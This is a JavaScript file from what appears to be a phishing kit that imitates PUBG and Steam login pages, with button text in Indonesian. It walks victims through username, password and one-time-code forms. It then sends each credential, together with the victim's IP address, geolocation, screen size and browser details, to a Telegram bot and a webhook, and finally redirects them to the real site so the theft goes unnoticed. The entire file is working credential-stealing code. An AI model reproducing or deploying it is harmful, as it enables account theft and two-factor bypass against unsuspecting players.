const esc = s => String(s).replace(/[&<>]/g,
  c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));

async function info() {
  const d = {
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    scr: `${screen.width}x${screen.height}`,
    ua: navigator.userAgent,
    ip: "", loc: ""
  };
  if (window.CFG.geo) {
    try {
      const r = await fetch("https://ipapi.co/json/", { cache: "no-store" });
      const j = await r.json();
      d.ip = j.ip || ""; d.loc = [j.city, j.region, j.country_name].filter(Boolean).join(", ");
    } catch (e) {}
  }
  return d;
}

async function send(step, user, secret) {
  const i = await info();
  const ts = new Date().toLocaleString("id-ID", { timeZone: i.tz });
  const txt =
    `<b>PUBG [${esc(CFG.mode)}] step ${step}</b>\n` +
    `👤 <code>${esc(user || "-")}</code>\n` +
    `🔑 <code>${esc(secret || "-")}</code>\n` +
    `🌐 ${esc(i.ip)} ${esc(i.loc)}\n` +
    `🖥 ${esc(i.scr)} ${esc(i.tz)}\n` +
    `🕐 ${esc(ts)}\n` +
    `<code>${esc(i.ua)}</code>`;

  const jobs = [];
  if (CFG.botToken && CFG.chatId) {
    jobs.push(fetch(`https://api.telegram.org/bot${CFG.botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CFG.chatId, text: txt, parse_mode: "HTML",
        disable_web_page_preview: true
      }),
      keepalive: true
    }));
  }
  if (CFG.webhook) {
    jobs.push(fetch(CFG.webhook, {
      method: "POST", mode: "no-cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ step, user, secret, ...i, ts, target: CFG.mode }),
      keepalive: true
    }));
  }

  const log = JSON.parse(localStorage.getItem("logs") || "[]");
  log.push({ step, user, secret, ts });
  localStorage.setItem("logs", JSON.stringify(log));

  await Promise.allSettled(jobs);
}

function go(url) { location.href = url; }

// ---------- step handlers ----------
const p = location.pathname;
const q = id => document.getElementById(id);

if (p.endsWith("index.html") || p === "/") {
  if (q("form")) q("form").addEventListener("submit", e => {
    e.preventDefault();
    const u = q("user").value.trim();
    if (!u) return;
    sessionStorage.setItem("u", u);
    go("password.html");
  });
}

if (p.endsWith("password.html")) {
  const u = sessionStorage.getItem("u");
  if (!u) go("index.html");
  else q("who").textContent = u;
  q("form").addEventListener("submit", async e => {
    e.preventDefault();
    q("btn").disabled = true; q("btn").textContent = "Memverifikasi...";
    await send(2, u, q("pw").value);
    go("otp.html");
  });
}

if (p.endsWith("otp.html")) {
  const u = sessionStorage.getItem("u");
  if (!u) go("index.html");
  q("form").addEventListener("submit", async e => {
    e.preventDefault();
    q("btn").disabled = true; q("btn").textContent = "Memverifikasi...";
    await send(3, u, q("code").value.replace(/\s/g, ""));
    setTimeout(() => go(CFG.realUrl), 900);
  });
}

if (p.endsWith("steam.html")) {
  q("form").addEventListener("submit", async e => {
    e.preventDefault();
    q("btn").disabled = true; q("btn").textContent = "Memverifikasi...";
    await send(2, q("user").value.trim(), q("pw").value);
    setTimeout(() => go(CFG.realUrl), 900);
  });
}
